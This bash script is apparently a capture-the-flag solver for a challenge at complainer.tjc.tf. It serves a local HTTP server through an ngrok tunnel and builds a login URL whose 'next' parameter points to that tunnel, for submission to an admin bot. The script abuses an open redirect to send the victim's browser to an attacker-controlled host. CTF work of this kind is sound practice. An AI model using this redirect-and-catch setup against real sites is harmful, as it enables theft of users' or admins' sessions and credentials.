#!/bin/bash

BASE_URL="https://complainer.tjc.tf"

tmux split-window -h "python3 -m http.server 8000"

tmux split-window -v "ngrok http 8000"

sleep 1

# get the ngrok URL
NGROK_URL="$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')"

echo Submit $BASE_URL/login?next=$NGROK_URL to the admin bot

xsel --clipboard --input <<< "$BASE_URL/login?next=$NGROK_URL"

read;

# cleanup
killall ngrok
